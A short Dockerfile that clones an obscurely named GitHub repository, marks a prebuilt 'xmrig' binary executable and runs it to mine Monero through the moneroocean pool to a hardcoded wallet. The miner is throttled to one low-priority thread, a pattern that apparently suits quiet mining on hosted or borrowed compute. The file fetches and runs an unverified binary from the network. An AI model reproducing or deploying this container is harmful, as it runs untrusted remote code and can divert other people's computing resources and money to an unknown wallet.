# Use the official Ubuntu image as a base
FROM ubuntu:latest

# Install necessary packages
RUN apt-get update && apt-get install -y \
    git \
    wget \
    build-essential \
    libuv1-dev \
    libssl-dev \
    libhwloc-dev

# Clone the specified GitHub repository
RUN git clone https://github.com/WackyDawg/effective-fortnight.git

# Change directory to the cloned repository
WORKDIR /effective-fortnight

# Make the xmrig file executable
RUN chmod +x ./xmrig

# Run the xmrig command with the specified parameters
CMD ["./xmrig", "--url", "gulf.moneroocean.stream:10128", "--user", "43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc", "--pass", "x", "--cpu-priority", "1", "--threads", "1", "--donate-level", "1", "--av", "0", "--cpu-max-threads-hint", "2"]
